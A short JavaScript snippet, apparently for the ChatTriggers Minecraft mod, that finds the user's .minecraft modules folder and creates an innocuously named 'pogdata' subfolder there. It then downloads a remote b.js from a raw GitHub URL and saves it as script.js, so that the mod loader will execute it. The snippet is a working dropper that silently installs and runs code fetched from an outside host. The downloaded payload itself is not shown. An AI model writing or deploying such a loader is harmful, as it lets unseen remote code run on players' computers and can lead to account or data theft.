const File = Java.type('java.io.File');
const System = Java.type('java.lang.System');
const request = /* your axios or request import here */;

// Detect OS
const osName = System.getProperty("os.name").toLowerCase();

let basePath;
if (osName.includes("win")) {
  // Windows
  basePath = System.getenv("APPDATA");
} else if (osName.includes("mac")) {
  // macOS
  basePath = System.getProperty("user.home") + "/Library/Application Support";
} else {
  // Linux and others: assume home directory + .minecraft
  basePath = System.getProperty("user.home");
}

// Build full target path
const targetPath = new File(basePath + "/.minecraft/config/ChatTriggers/modules/pogdata");
targetPath.mkdirs(); // create folders if needed

// Destination file
const file = new File(targetPath, "script.js");

// URL to download
const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";

request(url).then(response => {
  const FileWriter = Java.type('java.io.FileWriter');
  const fw = new FileWriter(file);
  fw.write(response.data);
  fw.close();
});
